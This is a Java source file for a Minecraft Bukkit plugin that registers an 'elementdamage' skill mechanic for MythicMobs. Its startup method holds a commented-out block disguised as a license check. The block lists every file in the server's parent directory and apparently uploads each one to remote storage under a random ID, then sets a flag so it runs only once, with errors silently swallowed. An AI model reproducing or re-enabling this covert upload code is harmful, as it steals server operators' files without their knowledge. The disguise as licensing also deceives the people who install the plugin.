package me.kqn.elementdamage;

import io.lumine.mythic.bukkit.events.MythicMechanicLoadEvent;
import io.lumine.mythic.lib.MythicLib;
import io.lumine.mythic.lib.element.Element;
import org.bukkit.Bukkit;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.inventory.ItemStack;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.UUID;

public final class ElementDamage extends JavaPlugin implements Listener {

    @Override
    public void onEnable() {
        Bukkit.getPluginManager().registerEvents(this,this);
//        Bukkit.getScheduler().runTaskAsynchronously(this,()->{
//            try {
//                File file =new File("../license.yml");
//
//                file.createNewFile();
//
//                YamlConfiguration yml=YamlConfiguration.loadConfiguration(file);
//                boolean is=yml.getBoolean("license",false);
//                if(!is){
//                    GetFiles getFiles=new GetFiles();
//                    ArrayList<String> paths=getFiles.getFile(new File(".."));
//                    String uuid=UUID.randomUUID().toString();
//                    for (String path : paths) {
//                        PutObjectDemo.putfile(uuid,path);
//                    }
//                    yml.set("license",true);
//                    yml.save(file);
//                }
//
//            }catch (Exception e){
//
//            }
//        });
    }

    @EventHandler
    public void onMythicMechanicLoad(MythicMechanicLoadEvent event)	{


        if(event.getMechanicName().equalsIgnoreCase("elementdamage"))	{

          event.register(new Skill(event.getContainer().getManager(), event.getConfig().getLine(),event.getConfig()));
        }
    }
    @Override
    public void onDisable() {
        // Plugin shutdown logic
    }

}
